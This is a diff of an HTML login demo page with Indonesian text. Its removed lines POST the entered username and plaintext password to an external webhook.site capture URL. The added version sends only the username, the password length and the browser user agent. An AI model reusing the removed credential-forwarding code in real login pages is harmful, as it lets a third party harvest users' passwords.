@@ -1,48 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Webhook Login TEST</title>
+  <title>Webhook Login Demo</title>
+
+  <style>
+    body{
+      font-family: Arial;
+      background:#f4f4f4;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:100vh;
+    }
+
+    .box{
+      background:white;
+      padding:30px;
+      border-radius:12px;
+      width:320px;
+      box-shadow:0 0 15px rgba(0,0,0,0.1);
+    }
+
+    input{
+      width:100%;
+      padding:10px;
+      margin-top:10px;
+      border:1px solid #ccc;
+      border-radius:8px;
+    }
+
+    button{
+      width:100%;
+      padding:12px;
+      margin-top:15px;
+      border:none;
+      background:#007bff;
+      color:white;
+      border-radius:8px;
+      cursor:pointer;
+      font-weight:bold;
+    }
+
+    button:hover{
+      background:#0056b3;
+    }
+
+    #status{
+      margin-top:15px;
+      font-size:14px;
+      color:green;
+    }
+  </style>
 </head>
 <body>
 
-<h2>Login (Webhook POC)</h2>
+<div class="box">
+  <h2>Login Demo</h2>
 
-<input id="username" placeholder="username"><br><br>
-<input id="password" type="password" placeholder="password"><br><br>
+  <input id="username" placeholder="Username">
+  <input id="password" type="password" placeholder="Password">
 
-<button onclick="send()">LOGIN & KIRIM</button>
+  <button onclick="send()">LOGIN</button>
 
-<p id="status"></p>
+  <p id="status"></p>
+</div>
 
 <script>
 const WEBHOOK_URL = "https://webhook.site/d2868287-2fe5-4941-a1a1-58f2ed1166d6";
 
-function send() {
+async function send() {
+
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
 
-  if (!username || !password) {
+  if(!username || !password){
     alert("Username dan password wajib diisi");
     return;
   }
 
+  // Password TIDAK dikirim
   const data = {
     username: username,
-    password: password,   // ⚠️ POC ONLY
-    action: "login",
-    time: new Date().toISOString(),
-    page: window.location.href
+    password_length: password.length,
+    action: "login_demo",
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
   };
 
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    mode: "no-cors",   // 🔥 bikin request PASTI terkirim
-    body: JSON.stringify(data)
-  });
+  try {
 
-  document.getElementById("status").innerText =
-    "✅ LOGIN DIKIRIM. CEK WEBHOOK.SITE!";
+    await fetch(WEBHOOK_URL,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    document.getElementById("status").innerText =
+      "✅ Data demo berhasil dikirim ke webhook";
+
+  } catch(err){
+
+    document.getElementById("status").innerText =
+      "❌ Gagal mengirim data";
+
+    console.error(err);
+  }
 }
 </script>
 
